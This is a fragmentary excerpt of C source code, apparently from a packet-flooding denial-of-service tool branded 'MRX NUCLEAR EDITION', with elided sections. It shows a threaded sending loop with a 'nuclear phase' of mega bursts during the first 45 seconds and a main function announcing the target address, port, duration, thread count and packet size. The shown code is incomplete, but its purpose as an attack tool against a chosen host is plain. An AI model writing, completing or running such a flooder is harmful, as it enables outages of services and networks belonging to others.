...
void *send_smart_packets(void *arg) {
    ...
    while (time(NULL) - start_time < DURATION_TIME) {
        if (nuclear_phase) {
            // NUCLEAR PHASE - First 45 seconds
            if (time(NULL) - start_time < 45) {
                for (int mega_burst = 0; mega_burst < 35; mega_burst++) {
...
int main(int argc, char *argv[]) {
    ...
    // 🚀 ONLY START MESSAGE
    printf("💀 MRX NUCLEAR EDITION: Sending to %s:%d for %d seconds with %d threads, %d bytes\n",
